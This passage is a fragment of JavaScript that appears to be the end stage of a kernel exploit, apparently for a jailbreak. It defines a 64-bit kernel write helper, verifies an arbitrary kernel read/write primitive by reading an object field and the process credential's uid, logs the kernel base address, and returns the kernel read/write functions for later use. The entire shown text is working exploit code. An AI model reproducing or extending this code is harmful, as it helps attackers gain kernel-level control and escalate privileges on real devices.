    function write8(X, V) { kwrite32(X, V.low | 0); kwrite32(X.add32(4), V.hi | 0); }

    // Verify krw
    if (kread32(A_OID.add32(0x10)) !== 27) throw new Error("krw verify failed");
    const uidNow = sc(SYS.getuid).i32 >>> 0; if (kread32(UCRED.add32(0x04)) !== uidNow) throw new Error("krw heap verify failed");

    log("K0-DONE", "kernel_base=" + KBASE + " ucred=" + UCRED + " krw=OK");

    return {
        kernelBase: KBASE,
        ucred: UCRED,
        curthread: CT1,
        kv: { read8, write8, kread32, kwrite32, steer },
    };
}